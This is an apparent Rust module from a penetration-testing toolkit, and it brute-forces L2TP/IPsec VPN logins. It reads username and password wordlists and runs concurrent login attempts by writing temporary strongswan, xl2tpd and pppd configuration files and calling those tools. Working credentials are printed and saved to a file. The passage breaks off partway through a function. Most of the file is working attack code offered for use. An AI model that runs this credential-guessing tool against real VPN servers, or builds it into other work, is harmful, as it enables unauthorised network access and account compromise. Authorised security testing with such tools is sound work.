use anyhow::{anyhow, Result};
use colored::*;
use futures::stream::{FuturesUnordered, StreamExt};

use std::{
    fs::File,
    io::Write,
    path::{Path, PathBuf},
    sync::Arc,
    sync::atomic::{AtomicBool, Ordering},
    time::Duration,
};
use tokio::process::Command;
use tokio::sync::{Mutex, Semaphore};
use tokio::time::{sleep, timeout};

use crate::utils::{
    prompt_yes_no, prompt_wordlist, prompt_default, prompt_int_range,
    load_lines, normalize_target,
};
use crate::modules::creds::utils::BruteforceStats;

const PROGRESS_INTERVAL_SECS: u64 = 2;

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   L2TP/IPsec VPN Brute Force Module                       ║".cyan());
    println!("{}", "║   Supports: strongswan, xl2tpd, pppd, nmcli, rasdial     ║".cyan());
    println!("{}", "║   ⚠️  Requires root/admin privileges for IPsec            ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
    println!();
}

pub async fn run(target: &str) -> Result<()> {
    display_banner();
    println!("{}", format!("[*] Target: {}", target).cyan());

    // Pre-flight check: validate L2TP server is reachable
    // We need to resolve the address for the IPsec check
    let addr = normalize_target(target)?; 
    let server_ip = addr.split(':').next().unwrap_or(&addr);

    println!("[*] Testing L2TP server connectivity...");
    if !test_l2tp_connectivity(server_ip, Duration::from_secs(5)).await? {
        println!("{}", "[!] Warning: L2TP server does not appear to be responding. Continuing anyway...".yellow());
    } else {
        println!("[+] L2TP server is responding");
    }

    let port: u16 = prompt_default("L2TP/IPsec Port (IKE)", "500").await?
        .parse().unwrap_or(500);

    let usernames_file_path = prompt_wordlist("Username wordlist path").await?;
    let passwords_file_path = prompt_wordlist("Password wordlist path").await?;

    // Optional: Pre-shared key (PSK) for IPsec phase
    let psk_str = prompt_default("IPsec Pre-shared Key (PSK) - optional, press Enter to skip", "").await?;
    let psk = if psk_str.is_empty() { None } else { Some(psk_str) };

    // Security warning for PSK
    if let Some(ref psk_val) = psk {
        if psk_val.len() < 8 {
            println!("{}", "[!] Warning: PSK is very short. Consider using a longer, more secure key.".yellow());
        }
        if psk_val.chars().all(|c| c.is_alphanumeric()) && !psk_val.chars().any(|c| c.is_uppercase()) {
            println!("{}", "[!] Warning: PSK contains only lowercase letters/numbers. Consider adding special characters.".yellow());
        }
    }

    let concurrency = prompt_int_range("Max concurrent tasks", 5, 1, 10000).await? as usize;
    let timeout_secs = prompt_int_range("Connection timeout (seconds)", 15, 1, 300).await? as u64;

    let stop_on_success = prompt_yes_no("Stop on first success?", true).await?;
    let _save_results = prompt_yes_no("Save results to file?", true).await?;
    let save_path = if _save_results {
        Some(prompt_default("Output file name", "l2tp_results.txt").await?)
    } else {
        None
    };
    let verbose = prompt_yes_no("Verbose mode?", false).await?;
    let combo_mode = prompt_yes_no("Combination mode? (try every password with every user)", false).await?;

    let normalized = normalize_target(target)?;
    let addr = if (normalized.starts_with('[') && normalized.ends_with(']')) || (!normalized.contains(':')) {
        format!("{}:{}", normalized, port)
    } else {
        normalized
    };
    let found_credentials = Arc::new(Mutex::new(Vec::new()));
    let stop_signal = Arc::new(AtomicBool::new(false));
    let stats = Arc::new(BruteforceStats::new());

    println!("\n[*] Starting brute-force on {}", addr);
    println!("[*] Timeout: {} seconds", timeout_secs);
    if psk.is_some() {
        println!("[*] Using IPsec PSK authentication");
    } else {
        println!("[*] No PSK specified - attempting direct L2TP or tools without IPsec");
    }

    // Report available tools
    println!("[*] Checking available L2TP tools...");
    let tools = detect_available_tools().await;
    if tools.is_empty() {
        println!("{}", "[!] No L2TP tools detected. Module may not work properly.".yellow());
    } else {
        println!("[+] Available tools: {}", tools.join(", "));
    }

    let users = load_lines(&usernames_file_path)?;
    if users.is_empty() {
        println!("[!] Username wordlist is empty. Exiting.");
        return Ok(());
    }
    println!("[*] Loaded {} usernames", users.len());

    let passwords = load_lines(&passwords_file_path)?;
    if passwords.is_empty() {
        println!("[!] Password wordlist is empty. Exiting.");
        return Ok(());
    }
    println!("[*] Loaded {} passwords", passwords.len());

    let total_attempts = if combo_mode { users.len() * passwords.len() } else { std::cmp::max(users.len(), passwords.len()) };
    println!("{}", format!("[*] Approximate attempts: {}", total_attempts).cyan());
    println!();

    // Start progress reporter
    let stats_clone = stats.clone();
    let stop_clone = stop_signal.clone();
    let progress_handle = tokio::spawn(async move {
        loop {
            if stop_clone.load(Ordering::Relaxed) {
                break;
            }
            stats_clone.print_progress();
            sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS)).await;
        }
    });

    let semaphore = Arc::new(Semaphore::new(concurrency));
    let mut tasks = FuturesUnordered::new();
    let timeout_duration = Duration::from_secs(timeout_secs);

    // Setup cleanup handler for graceful shutdown
    // This is hard to do cleanly in this structure as `tokio::signal` blocks. 
    // We can spawn it but it might not be easy to interact with the main flow without cancellation token.
    // The previous code had a cleanup_handle but it just did process::exit. This is fine for CLI tool.
    let cleanup_handle = tokio::spawn(async move {
        tokio::signal::ctrl_c().await.ok();
        println!("\n[!] Received interrupt signal. Exiting (cleanup may be incomplete)...");
        std::process::exit(130);
    });
    let _ = cleanup_handle;

    // Work generation
    if combo_mode {
        for user in &users {
            for pass in &passwords {
                if stop_on_success && stop_signal.load(Ordering::Relaxed) { break; }
                spawn_l2tp_task(
                    &mut tasks, &semaphore, 
                    addr.clone(), user.clone(), pass.clone(), psk.clone(),
                    found_credentials.clone(), stop_signal.clone(), stats.clone(),
                    verbose, stop_on_success, timeout_duration
                ).await;
            }
            if stop_on_success && stop_signal.load(Ordering::Relaxed) { break; }
        }
    } else {
        let max_len = std::cmp::max(users.len(), passwords.len());
        for i in 0..max_len {
            if stop_on_success && stop_signal.load(Ordering::Relaxed) { break; }
            let user = &users[i % users.len()];
            let pass = &passwords[i % passwords.len()];
             spawn_l2tp_task(
                &mut tasks, &semaphore, 
                addr.clone(), user.clone(), pass.clone(), psk.clone(),
                found_credentials.clone(), stop_signal.clone(), stats.clone(),
                verbose, stop_on_success, timeout_duration
            ).await;
        }
    }

    // Wait for remaining tasks
    while let Some(res) = tasks.next().await {
        if let Err(e) = res {
             stats.record_error(format!("Task panic: {}", e)).await;
        }
    }

    // Stop progress reporter
    stop_signal.store(true, Ordering::Relaxed);
    let _ = progress_handle.await;

    // Print final statistics
    stats.print_final().await;

    let creds = found_credentials.lock().await;
    if creds.is_empty() {
        println!("{}", "[-] No credentials found.".yellow());
    } else {
        println!("{}", format!("[+] Found {} valid credential(s):", creds.len()).green().bold());
        for (host_addr, user, pass) in creds.iter() {
            println!("    {} -> {}:{}", host_addr, user, pass);
        }

        if let Some(path_str) = save_path {
            let filename = get_filename_in_current_dir(&path_str);
            if let Ok(mut file) = File::create(&filename) {
                for (host_addr, user, pass) in creds.iter() {
                    let _ = writeln!(file, "{} -> {}:{}", host_addr, user, pass);
                }
                println!("[+] Results saved to '{}'", filename.display());
            }
        }
    }

    Ok(())
}

async fn spawn_l2tp_task(
    tasks: &mut FuturesUnordered<tokio::task::JoinHandle<()>>,
    semaphore: &Arc<Semaphore>,
    addr: String,
    user: String,
    pass: String,
    psk: Option<String>,
    found: Arc<Mutex<Vec<(String, String, String)>>>,
    stop_signal: Arc<AtomicBool>,
    stats: Arc<BruteforceStats>,
    verbose: bool,
    stop_on_success: bool,
    timeout: Duration
) {
    let permit = semaphore.clone().acquire_owned().await.ok();
    if permit.is_none() { return; }

    tasks.push(tokio::spawn(async move {
        // Drop permit when done
        let _permit = permit;
        
        if stop_on_success && stop_signal.load(Ordering::Relaxed) { return; }

        match try_l2tp_login(&addr, &user, &pass, &psk, timeout).await {
            Ok(true) => {
                println!("\r{}", format!("[+] {} -> {}:{}", addr, user, pass).green().bold());
                found.lock().await.push((addr.clone(), user.clone(), pass.clone()));
                stats.record_success();
                if stop_on_success {
                    stop_signal.store(true, Ordering::Relaxed);
                }
            }
            Ok(false) => {
                stats.record_failure();
                if verbose {
                    println!("\r{}", format!("[-] {} -> {}:{}", addr, user, pass).dimmed());
                }
            }
            Err(e) => {
                stats.record_error(e.to_string()).await;
                if verbose {
                    println!("\r{}", format!("[!] {}: error: {}", addr, e).red());
                }
            }
        }
        
        // Rate limiting logic from original module (200ms sleep)
        sleep(Duration::from_millis(200)).await;
    }));
}


fn get_filename_in_current_dir(input: &str) -> PathBuf {
    let name = Path::new(input)
        .file_name()
        .unwrap_or_default()
        .to_string_lossy()
        .to_string();
    PathBuf::from(format!("./{}", name))
}
/// Attempts L2TP/IPsec VPN login
/// 
/// Note: L2TP/IPsec authentication is complex and requires:
/// - Root privileges for IPsec operations
/// - Proper configuration files (/etc/ipsec.conf, /etc/ipsec.secrets, etc.)
/// - IPsec phase (machine authentication with PSK/certificates)
/// - L2TP phase (user authentication with username/password)
/// 
/// This implementation provides the framework. A full implementation would need to:
/// - Create temporary configuration files dynamically
/// - Use ipsec/strongswan commands to establish IPsec tunnel
/// - Use xl2tpd or pppd to establish L2TP tunnel within IPsec
/// - Parse connection status and authentication responses
async fn try_l2tp_login(addr: &str, username: &str, password: &str, psk: &Option<String>, timeout_duration: Duration) -> Result<bool> {
    // Try using strongswan (ipsec/strongswan) if available
    let strongswan_check = Command::new("which")
        .arg("ipsec")
        .output()
        .await;
    
    if strongswan_check.is_ok() && strongswan_check.unwrap().status.success() {
        return try_l2tp_strongswan(addr, username, password, psk, timeout_duration).await;
    }

    // Fallback: try xl2tpd if available
    let xl2tpd_check = Command::new("which")
        .arg("xl2tpd")
        .output()
        .await;
    
    if xl2tpd_check.is_ok() && xl2tpd_check.unwrap().status.success() {
        return try_l2tp_xl2tpd(addr, username, password, psk, timeout_duration).await;
    }

    // Try using system L2TP tools
    #[cfg(target_os = "windows")]
    {
        // Try Windows built-in rasdial for VPN connections
        return try_l2tp_rasdial(addr, username, password, psk, timeout_duration).await;
    }

    #[cfg(target_os = "linux")]
    {
        // Try using pppd with l2tp plugin if available
        let pppd_check = Command::new("which")
            .arg("pppd")
            .output()
            .await;

        if pppd_check.is_ok() && pppd_check.unwrap().status.success() {
            return try_l2tp_pppd(addr, username, password, psk, timeout_duration).await;
        }

        // Try NetworkManager L2TP support
        let nmcli_check = Command::new("which")
            .arg("nmcli")
            .output()
            .await;

        if nmcli_check.is_ok() && nmcli_check.unwrap().status.success() {
            return try_l2tp_nmcli(addr, username, password, psk, timeout_duration).await;
        }
    }

    #[cfg(target_os = "macos")]
    {
        // Try macOS built-in L2TP support
        return try_l2tp_macos(addr, username, password, psk, timeout_duration).await;
    }

    // As a last resort, try direct L2TP connection
    try_l2tp_fallback(addr, username, password, timeout_duration).await
}

async fn try_l2tp_strongswan(addr: &str, username: &str, password: &str, psk: &Option<String>, timeout_duration: Duration) -> Result<bool> {
    // Extract IP address from addr (remove port if present)
    let server_ip = addr.split(':').next().unwrap_or(addr);

    // Check if we have PSK for IPsec phase
    if psk.is_none() {
        return Err(anyhow!("L2TP/IPsec requires a Pre-shared Key (PSK) for IPsec phase"));
    }
    let psk_value = psk.as_ref().unwrap();

    // Create unique connection name to avoid conflicts
    let conn_name = format!("l2tp_brute_{}_{}", std::process::id(), std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_millis());

    // Use swanctl (modern strongswan) if available, fallback to ipsec command
    let use_swanctl = Command::new("which")
        .arg("swanctl")
        .output()
        .await
        .map(|out| out.status.success())
        .unwrap_or(false);

    if use_swanctl {
        try_l2tp_swanctl(&server_ip, username, password, psk_value, &conn_name, timeout_duration).await
    } else {
        try_l2tp_ipsec_command(&server_ip, username, password, psk_value, &conn_name, timeout_duration).await
    }
}

async fn try_l2tp_swanctl(server_ip: &str, username: &str, password: &str, psk: &str, conn_name: &str, timeout_duration: Duration) -> Result<bool> {
    // Create temporary swanctl config files
    let temp_dir = std::env::temp_dir();
    let swan_dir = temp_dir.join(format!("swanctl_{}", conn_name));
    std::fs::create_dir_all(&swan_dir)?;

    let connection_conf = format!(
        r#"{{
    connections: {{
        {}: {{
            local_addrs: ["%any"],
            remote_addrs: ["{}"],
            version: 1,
            proposals: ["aes128-sha1-modp1024"],
            local: {{
                auth: psk
            }},
            remote: {{
                auth: psk
            }},
            children: {{
                {}: {{
                    local_ts: ["0.0.0.0/0"],
                    remote_ts: ["0.0.0.0/0"],
                    esp_proposals: ["aes128-sha1"],
                    mode: transport,
                    protocols: [17]  // UDP
                }}
            }}
        }}
    }},
    secrets: {{
        ike-{}: {{
            secret: "{}"
        }}
    }}
}}"#,
        conn_name, server_ip, conn_name, conn_name, psk
    );

    let conf_path = swan_dir.join("connections.conf");
    std::fs::write(&conf_path, connection_conf)
        .map_err(|e| anyhow!("Failed to write swanctl config: {}", e))?;

    // Load configuration
    let load_result = Command::new("swanctl")
        .args(["--load-conns", "--file", &conf_path.to_string_lossy()])
        .output()
        .await;

    if !load_result.map(|out| out.status.success()).unwrap_or(false) {
        let _ = std::fs::remove_dir_all(&swan_dir);
        return Ok(false); // Configuration failed, likely invalid PSK or server config
    }

    // Initiate connection
    let init_result = Command::new("swanctl")
        .args(["-i", conn_name])
        .output()
        .await;

    if !init_result.map(|out| out.status.success()).unwrap_or(false) {
        let _ = Command::new("swanctl").args(["-t", conn_name]).output().await;
        let _ = std::fs::remove_dir_all(&swan_dir);
        return Ok(false);
    }

    // Wait for connection establishment
    sleep(Duration::from_secs(2)).await;

    // Check if IKE_SA is established
    let status_result = Command::new("swanctl")
        .args(["-l", "--ike", conn_name])
        .output()
        .await;

    let connected = if let Ok(output) = status_result {
        let stdout = String::from_utf8_lossy(&output.stdout);
        stdout.contains("ESTABLISHED")
    } else {
        false
    };

    if !connected {
        let _ = Command::new("swanctl").args(["-t", conn_name]).output().await;
        let _ = std::fs::remove_dir_all(&swan_dir);
        return Ok(false);
    }

    // Now try L2TP within the IPsec tunnel
    let l2tp_result = try_l2tp_over_ipsec(server_ip, username, password, timeout_duration).await;

    // Clean up
    let _ = Command::new("swanctl").args(["-t", conn_name]).output().await;
    let _ = std::fs::remove_dir_all(&swan_dir);

    l2tp_result
}

async fn try_l2tp_ipsec_command(server_ip: &str, username: &str, password: &str, psk: &str, conn_name: &str, timeout_duration: Duration) -> Result<bool> {
    // Fallback to legacy ipsec command
    // Create temporary config files
    let temp_dir = std::env::temp_dir();
    let ipsec_conf_path = temp_dir.join(format!("{}.conf", conn_name));
    let ipsec_secrets_path = temp_dir.join(format!("{}.secrets", conn_name));

    // Build IPsec configuration
    let ipsec_conf = format!(
        r#"conn {}
    type=transport
    authby=secret
    left=%defaultroute
    right={}
    rightprotoport=17/1701
    auto=add
    keyexchange=ikev1
    ike=aes128-sha1-modp1024
    esp=aes128-sha1
"#,
        conn_name, server_ip
    );

    // Build secrets file
    let ipsec_secrets = format!(
        r#"%any %any : PSK "{}"
"#,
        psk
    );

    // Write config files
    std::fs::write(&ipsec_conf_path, ipsec_conf)
        .map_err(|e| anyhow!("Failed to write IPsec config: {}", e))?;
    std::fs::write(&ipsec_secrets_path, ipsec_secrets)
        .map_err(|e| anyhow!("Failed to write IPsec secrets: {}", e))?;

    // Set permissions on secrets file
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = std::fs::metadata(&ipsec_secrets_path)?.permissions();
        perms.set_mode(0o600);
        std::fs::set_permissions(&ipsec_secrets_path, perms)?;
    }

    // Load and initiate connection
    let load_result = Command::new("ipsec")
        .args(["auto", "--add", conn_name])
        .output()
        .await;

    if !load_result.map(|out| out.status.success()).unwrap_or(false) {
        let _ = std::fs::remove_file(&ipsec_conf_path);
        let _ = std::fs::remove_file(&ipsec_secrets_path);
        return Ok(false);
    }

    let up_result = Command::new("ipsec")
        .args(["auto", "--up", conn_name])
        .output()
        .await;

    if !up_result.map(|out| out.status.success()).unwrap_or(false) {
        let _ = Command::new("ipsec").args(["auto", "--delete", conn_name]).output().await;
        let _ = std::fs::remove_file(&ipsec_conf_path);
        let _ = std::fs::remove_file(&ipsec_secrets_path);
        return Ok(false);
    }

    // Wait for IPsec to establish
    sleep(Duration::from_secs(3)).await;

    // Check if connection is up
    let status_result = Command::new("ipsec")
        .args(["status", conn_name])
        .output()
        .await;

    let connected = if let Ok(output) = status_result {
        let stdout = String::from_utf8_lossy(&output.stdout);
        stdout.contains("ESTABLISHED") || stdout.contains("IPsec SA established")
    } else {
        false
    };

    if !connected {
        let _ = Command::new("ipsec").args(["auto", "--down", conn_name]).output().await;
        let _ = Command::new("ipsec").args(["auto", "--delete", conn_name]).output().await;
        let _ = std::fs::remove_file(&ipsec_conf_path);
        let _ = std::fs::remove_file(&ipsec_secrets_path);
        return Ok(false);
    }

    // Now try L2TP within the IPsec tunnel
    let l2tp_result = try_l2tp_over_ipsec(server_ip, username, password, timeout_duration).await;

    // Clean up
    let _ = Command::new("ipsec").args(["auto", "--down", conn_name]).output().await;
    let _ = Command::new("ipsec").args(["auto", "--delete", conn_name]).output().await;
    let _ = std::fs::remove_file(&ipsec_conf_path);
    let _ = std::fs::remove_file(&ipsec_secrets_path);

    l2tp_result
}

async fn try_l2tp_over_ipsec(server_ip: &str, username: &str, password: &str, timeout_duration: Duration) -> Result<bool> {
    // Try to establish L2TP connection within the IPsec tunnel
    // This could use xl2tpd, pppd, or network-level L2TP client

    // First try xl2tpd if available
    let xl2tpd_check = Command::new("which")
        .arg("xl2tpd")
        .output()
        .await;

    if xl2tpd_check.map(|out| out.status.success()).unwrap_or(false) {
        return try_l2tp_xl2tpd_over_ipsec(server_ip, username, password, timeout_duration).await;
    }

    // Fallback to pppd with L2TP plugin
    #[cfg(target_os = "linux")]
    {
        let pppd_check = Command::new("which")
            .arg("pppd")
            .output()
            .await;

        if pppd_check.map(|out| out.status.success()).unwrap_or(false) {
            return try_l2tp_pppd_over_ipsec(server_ip, username, password, timeout_duration).await;
        }
    }

    // As a last resort, try direct L2TP connection (may work if IPsec is already established)
    try_l2tp_direct(server_ip, username, password, timeout_duration).await
}

async fn try_l2tp_xl2tpd(addr: &str, username: &str, password: &str, _psk: &Option<String>, timeout_duration: Duration) -> Result<bool> {
    // xl2tpd requires configuration files
    // Create temporary config files for this attempt
    let temp_dir = std::env::temp_dir();
    let conn_name = format!("l2tp_brute_{}_{}", std::process::id(), std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_millis());

    let xl2tpd_conf_path = temp_dir.join(format!("{}.xl2tpd.conf", conn_name));
    let ppp_secrets_path = temp_dir.join(format!("{}.chap-secrets", conn_name));
    let ppp_options_path = temp_dir.join(format!("{}.options", conn_name));

    let server_ip = addr.split(':').next().unwrap_or(addr);

    // Build xl2tpd config
    let xl2tpd_conf = format!(
        r#"[global]
port = 1701

[lac {}]
lns = {}
pppoptfile = {}
length bit = yes
require chap = yes
refuse pap = yes
require authentication = yes
ppp debug = no
"#,
        conn_name, server_ip, ppp_options_path.to_string_lossy()
    );

    // Build PPP options
    let ppp_options = format!(
        r#"noauth
user "{}"
password "{}"
plugin pppol2tp.so
pppol2tp_lns {}
pppol2tp_tunnel_id 0
pppol2tp_session_id 0
"#,
        username, password, server_ip
    );

    // Build PPP secrets (CHAP)
    let ppp_secrets = format!(
        r#"# Secrets for authentication using CHAP
# client    server    secret    IP addresses
"{}"    *    "{}"    *
"#,
        username, password
    );

    // Write config files
    std::fs::write(&xl2tpd_conf_path, xl2tpd_conf)
        .map_err(|e| anyhow!("Failed to write xl2tpd config: {}", e))?;
    std::fs::write(&ppp_options_path, ppp_options)
        .map_err(|e| anyhow!("Failed to write PPP options: {}", e))?;
    std::fs::write(&ppp_secrets_path, ppp_secrets)
        .map_err(|e| anyhow!("Failed to write PPP secrets: {}", e))?;

    // Try to connect using xl2tpd-control
    // Note: xl2tpd daemon must be running with our config
    let mut child = Command::new("xl2tpd")
        .args(["-c", &xl2tpd_conf_path.to_string_lossy(), "-C", &ppp_secrets_path.to_string_lossy()])
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()?;

    // Give xl2tpd a moment to start
    sleep(Duration::from_millis(500)).await;

    // Try to initiate connection
    let connect_result = Command::new("xl2tpd-control")
        .args(["connect", &conn_name])
        .output()
        .await;

    if !connect_result.map(|out| out.status.success()).unwrap_or(false) {
        let _ = child.kill().await;
        let _ = std::fs::remove_file(&xl2tpd_conf_path);
        let _ = std::fs::remove_file(&ppp_options_path);
        let _ = std::fs::remove_file(&ppp_secrets_path);
        return Ok(false);
    }

    let result = match timeout(timeout_duration, child.wait()).await {
        Ok(Ok(status)) => {
            // xl2tpd returns different exit codes based on success
            // Check the output for connection success
            Ok(status.success())
        }
        Ok(Err(e)) => Err(anyhow!("xl2tpd error: {}", e)),
        Err(_) => {
            let _ = child.kill().await;
            Ok(false)
        }
    };

    // Clean up connection
    let _ = Command::new("xl2tpd-control")
        .args(["disconnect", &conn_name])
        .output()
        .await;

    // Clean up temp files
    let _ = std::fs::remove_file(&xl2tpd_conf_path);
    let _ = std::fs::remove_file(&ppp_options_path);
    let _ = std::fs::remove_file(&ppp_secrets_path);

    result
}

async fn try_l2tp_xl2tpd_over_ipsec(server_ip: &str, username: &str, password: &str, timeout_duration: Duration) -> Result<bool> {
    // xl2tpd over established IPsec tunnel
    let temp_dir = std::env::temp_dir();
    let conn_name = format!("l2tp_ipsec_{}_{}", std::process::id(), std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_millis());

    let xl2tpd_conf_path = temp_dir.join(format!("{}.xl2tpd.conf", conn_name));
    let ppp_secrets_path = temp_dir.join(format!("{}.chap-secrets", conn_name));
    let ppp_options_path = temp_dir.join(format!("{}.options", conn_name));

    // Build xl2tpd config for IPsec tunnel
    let xl2tpd_conf = format!(
        r#"[global]
port = 1701

[lac {}]
lns = {}
pppoptfile = {}
length bit = yes
require chap = yes
refuse pap = yes
require authentication = yes
ppp debug = no
"#,
        conn_name, server_ip, ppp_options_path.to_string_lossy()
    );

    // Build PPP options for IPsec
    let ppp_options = format!(
        r#"noauth
user "{}"
password "{}"
plugin pppol2tp.so
pppol2tp_lns {}
"#,
        username, password, server_ip
    );

    // Build PPP secrets
    let ppp_secrets = format!(
        r#"# Secrets for authentication using CHAP
"{}"    *    "{}"    *
"#,
        username, password
    );

    // Write config files
    std::fs::write(&xl2tpd_conf_path, xl2tpd_conf)
        .map_err(|e| anyhow!("Failed to write xl2tpd config: {}", e))?;
    std::fs::write(&ppp_options_path, ppp_options)
        .map_err(|e| anyhow!("Failed to write PPP options: {}", e))?;
    std::fs::write(&ppp_secrets_path, ppp_secrets)
        .map_err(|e| anyhow!("Failed to write PPP secrets: {}", e))?;

    // Start xl2tpd daemon
    let mut child = Command::new("xl2tpd")
        .args(["-c", &xl2tpd_conf_path.to_string_lossy(), "-C", &ppp_secrets_path.to_string_lossy(), "-D"])
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()?;

    // Give xl2tpd a moment to start
    sleep(Duration::from_millis(500)).await;

    // Initiate connection
    let connect_result = Command::new("xl2tpd-control")
        .args(["connect", &conn_name])
        .output()
        .await;

    let connection_success = connect_result.map(|out| out.status.success()).unwrap_or(false);

    if !connection_success {
        let _ = child.kill().await;
        let _ = std::fs::remove_file(&xl2tpd_conf_path);
        let _ = std::fs::remove_file(&ppp_options_path);
        let _ = std::fs::remove_file(&ppp_secrets_path);
        return Ok(false);
    }

    // Monitor for successful connection
    let mut success = false;
    let start_time = std::time::Instant::now();

    while start_time.elapsed() < timeout_duration {
        // Check if PPP interface is up
        let ifconfig_result = Command::new("ip")
            .args(["link", "show"])
            .output()
            .await;

        if let Ok(output) = ifconfig_result {
            let stdout = String::from_utf8_lossy(&output.stdout);
            if stdout.contains("ppp") {
                success = true;
                break;
            }
        }

        sleep(Duration::from_millis(500)).await;
    }

    // Clean up
    let _ = child.kill().await;
    let _ = Command::new("xl2tpd-control").args(["disconnect", &conn_name]).output().await;
    let _ = std::fs::remove_file(&xl2tpd_conf_path);
    let _ = std::fs::remove_file(&ppp_options_path);
    let _ = std::fs::remove_file(&ppp_secrets_path);

    Ok(success)
}

#[cfg(target_os = "linux")]
async fn try_l2tp_pppd(addr: &str, username: &str, password: &str, _psk: &Option<String>, timeout_duration: Duration) -> Result<bool> {
    // pppd with L2TP plugin for direct L2TP (without IPsec)
    let server_ip = addr.split(':').next().unwrap_or(addr);

    // Create temporary options file for pppd
    let temp_dir = std::env::temp_dir();
    let conn_name = format!("l2tp_pppd_{}_{}", std::process::id(), std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_millis());
    let options_file = temp_dir.join(format!("{}.options", conn_name));
    let secrets_file = temp_dir.join(format!("{}.secrets", conn_name));

    let options_content = format!(
        r#"noauth
nodetach
user "{}"
password "{}"
plugin pppol2tp.so
pppol2tp_lns {}
pppol2tp_tunnel_id 0
pppol2tp_session_id 0
"#,
        username, password, server_ip
    );

    let secrets_content = format!(
        r#"# Secrets for authentication using CHAP
"{}"    *    "{}"    *
"#,
        username, password
    );

    std::fs::write(&options_file, options_content)
        .map_err(|e| anyhow!("Failed to write pppd options: {}", e))?;
    std::fs::write(&secrets_file, secrets_content)
        .map_err(|e| anyhow!("Failed to write pppd secrets: {}", e))?;

    let mut child = Command::new("pppd")
        .args(["file", &options_file.to_string_lossy(), "chap-secrets", &secrets_file.to_string_lossy()])
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()?;

    let result = match timeout(timeout_duration, child.wait()).await {
        Ok(Ok(status)) => {
            // pppd returns 0 on successful connection
            Ok(status.success())
        }
        Ok(Err(e)) => Err(anyhow!("pppd error: {}", e)),
        Err(_) => {
            let _ = child.kill().await;
            Ok(false)
        }
    };

    // Clean up temp files
    let _ = std::fs::remove_file(&options_file);
    let _ = std::fs::remove_file(&secrets_file);

    result
}

#[cfg(target_os = "linux")]
async fn try_l2tp_pppd_over_ipsec(server_ip: &str, username: &str, password: &str, timeout_duration: Duration) -> Result<bool> {
    // pppd with L2TP over established IPsec tunnel
    let temp_dir = std::env::temp_dir();
    let conn_name = format!("l2tp_pppd_ipsec_{}_{}", std::process::id(), std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_millis());

    let options_file = temp_dir.join(format!("{}.options", conn_name));
    let secrets_file = temp_dir.join(format!("{}.secrets", conn_name));

    let options_content = format!(
        r#"noauth
nodetach
user "{}"
password "{}"
plugin pppol2tp.so
pppol2tp_lns {}
"#,
        username, password, server_ip
    );

    let secrets_content = format!(
        r#"# Secrets for authentication using CHAP
"{}"    *    "{}"    *
"#,
        username, password
    );

    std::fs::write(&options_file, options_content)
        .map_err(|e| anyhow!("Failed to write pppd options: {}", e))?;
    std::fs::write(&secrets_file, secrets_content)
        .map_err(|e| anyhow!("Failed to write pppd secrets: {}", e))?;

    let mut child = Command::new("pppd")
        .args(["file", &options_file.to_string_lossy(), "chap-secrets", &secrets_file.to_string_lossy()])
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()?;

    let result = match timeout(timeout_duration, child.wait()).await {
        Ok(Ok(status)) => {
            // Check if PPP interface was created
            let ifconfig_result = Command::new("ip")
                .args(["link", "show"])
                .output()
                .await;

            if let Ok(output) = ifconfig_result {
                let stdout = String::from_utf8_lossy(&output.stdout);
                Ok(stdout.contains("ppp") && status.success())
            } else {
                Ok(status.success())
            }
        }
        Ok(Err(e)) => Err(anyhow!("pppd error: {}", e)),
        Err(_) => {
            let _ = child.kill().await;
            Ok(false)
        }
    };

    // Clean up temp files
    let _ = std::fs::remove_file(&options_file);
    let _ = std::fs::remove_file(&secrets_file);

    result
}

async fn try_l2tp_direct(server_ip: &str, username: &str, password: &str, timeout_duration: Duration) -> Result<bool> {
    // Try direct L2TP connection without IPsec
    // This might work for servers that don't require IPsec

    #[cfg(target_os = "linux")]
    {
        // Try using l2tp-tools if available
        let l2tp_check = Command::new("which")
            .arg("l2tp")
            .output()
            .await;

        if l2tp_check.map(|out| out.status.success()).unwrap_or(false) {
            return try_l2tp_tools(server_ip, username, password, timeout_duration).await;
        }

        // Try using openl2tp if available
        let openl2tp_check = Command::new("which")
            .arg("openl2tpd")
            .output()
            .await;

        if openl2tp_check.map(|out| out.status.success()).unwrap_or(false) {
            return try_openl2tp(server_ip, username, password, timeout_duration).await;
        }
    }

    // As a last resort, try a simple network-based approach
    // This won't work for most L2TP servers but might detect if the service is running
    try_l2tp_network_probe(server_ip, timeout_duration).await
}

#[cfg(target_os = "linux")]
async fn try_l2tp_tools(server_ip: &str, username: &str, password: &str, timeout_duration: Duration) -> Result<bool> {
    // Use l2tp command-line tools
    let temp_dir = std::env::temp_dir();
    let conn_name = format!("l2tp_direct_{}_{}", std::process::id(), std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_millis());

    let config_file = temp_dir.join(format!("{}.conf", conn_name));

    let config_content = format!(
        r#"name = {}
server = {}
username = {}
password = {}
"#,
        conn_name, server_ip, username, password
    );

    std::fs::write(&config_file, config_content)
        .map_err(|e| anyhow!("Failed to write l2tp config: {}", e))?;

    let mut child = Command::new("l2tp")
        .args(["connect", &config_file.to_string_lossy()])
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()?;

    let result = match timeout(timeout_duration, child.wait()).await {
        Ok(Ok(status)) => Ok(status.success()),
        Ok(Err(e)) => Err(anyhow!("l2tp tools error: {}", e)),
        Err(_) => {
            let _ = child.kill().await;
            Ok(false)
        }
    };

    let _ = std::fs::remove_file(&config_file);
    result
}

#[cfg(target_os = "linux")]
async fn try_openl2tp(server_ip: &str, username: &str, password: &str, timeout_duration: Duration) -> Result<bool> {
    // Use openl2tp daemon
